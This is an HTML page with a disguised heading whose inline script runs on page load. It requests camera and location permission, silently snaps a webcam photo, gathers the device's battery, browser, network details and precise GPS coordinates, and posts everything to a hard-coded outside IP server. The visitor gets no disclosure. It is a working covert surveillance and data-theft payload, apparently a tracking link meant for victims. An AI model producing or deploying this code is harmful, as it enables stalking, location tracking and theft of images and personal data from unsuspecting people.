<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mancis Jau</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      background-color: #f0f0f0;
      padding: 20px;
    }
    h1 {
      color: #333;
    }
  </style>
</head>
<body>
  <h1>mauk sudsh aku co</h1>
  <p> src = images "betrik.png"</p>

  <script>
    async function requestPermissions() {
      try {
        // Request Camera Permission
        await navigator.mediaDevices.getUserMedia({ video: true });

        // Request Location Permission
        return new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            () => resolve(true),
            (err) => reject(err)
          );
        });
      } catch (err) {
        console.error("Permission error:", err);
        return false;
      }
    }

    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => (video.onloadedmetadata = resolve));
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Stop video stream to release resources
        stream.getTracks().forEach((track) => track.stop());

        return canvas.toDataURL('image/png');
      } catch (err) {
        console.error("Error capturing photo:", err);
        return null;
      }
    }

    async function collectDeviceInfo() {
      const data = {};

      try {
        // Battery Info
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          data.battery = {
            level: battery.level * 100 + '%',
            charging: battery.charging,
          };
        } else {
          data.battery = "Battery API not supported";
        }

        // Device Info
        data.device = {
          userAgent: navigator.userAgent || "Unknown User Agent",
          platform: navigator.platform || "Unknown Platform",
        };

        // Network Info
        if (navigator.connection) {
          const connection = navigator.connection;
          data.network = {
            type: connection.effectiveType || "Unknown",
            downlink: connection.downlink ? connection.downlink + ' Mbps' : "Unknown",
          };
        } else {
          data.network = "Network API not supported";
        }

        // Geolocation
        if (navigator.geolocation) {
          await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
              (position) => {
                data.location = {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy + ' meters',
                };
                resolve();
              },
              (error) => {
                data.location = { error: error.message };
                resolve();
              }
            );
          });
        } else {
          data.location = "Geolocation not supported";
        }
      } catch (err) {
        console.error("Error collecting device info:", err);
      }

      return data;
    }

    async function sendData() {
      if (!(await requestPermissions())) {
        alert("Camera and location permissions are required!");
        return;
      }

      const photo = await capturePhoto();
      const deviceInfo = await collectDeviceInfo();

      const data = {
        photo: photo,
        deviceInfo: deviceInfo,
      };

      try {
        const response = await fetch('http://36.75.64.201:5000/data', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data),
        });
        const result = await response.json();
        console.log('Server response:', result);
      } catch (err) {
        console.error('Error sending data:', err);
      }
    }

    // Call sendData when the page loads
    window.onload = sendData;
  </script>
</body>
</html>
